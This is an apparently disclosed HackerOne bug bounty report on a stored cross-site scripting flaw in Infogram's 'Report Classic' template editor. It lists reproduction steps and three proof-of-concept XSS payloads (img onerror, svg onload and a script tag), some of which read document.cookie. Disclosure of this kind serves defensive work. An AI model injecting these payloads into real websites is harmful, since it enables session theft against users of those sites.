# XSS on Report Classic

## Report Details
- **Report ID**: 282535
- **URL**: https://hackerone.com/reports/282535
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2017-10-24T16:04:51.058Z
- **Disclosed**: 2017-11-03T14:14:00.289Z

## Reporter
- **Username**: nihadrekanym
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: infogram

## Vulnerability Information
hi team ... 

i found XSS on https://infogram.com/app/#/library 

#step
..
1- go to https://infogram.com/app/#/library 
2- choose __Report Templates__ . 
3- Use __Report Classic__
4- click to __edit_data__
5- payload  
> <img/ src=1 onerror= alert(document.cookie)>
//#"><svg/onload=prompt(1)>
“><script>alert(document.cookie)</script>

6-execute XSS and which you edit data XSS stared


## Attachments
- edit_data.JPG
- edit_data_2.JPG
- XSS.JPG
- xss_3.JPG
- XSS2.JPG
